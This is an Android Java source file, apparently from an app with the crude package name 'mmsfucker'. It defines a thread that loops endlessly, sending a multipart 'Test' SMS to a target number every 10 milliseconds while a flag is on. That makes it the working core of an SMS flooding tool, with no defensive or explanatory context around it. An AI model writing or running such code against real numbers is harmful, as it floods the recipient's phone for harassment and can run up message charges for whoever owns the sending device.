package com.example.ejkim.mmsfucker;


import android.telephony.SmsManager;

import java.util.ArrayList;

public class MmsThread extends Thread {

    public String sendTo;
    public boolean check;


    public void run() {
        SmsManager smsManager = SmsManager.getDefault();
        ArrayList<String> partMessage = smsManager.divideMessage("Test");


        while(true) {
            while (check) {
                smsManager.sendMultipartTextMessage(sendTo, null, partMessage, null, null);

                try {
                    sleep(10);
                } catch (Exception e) {

                }
            }
        }
    }
}
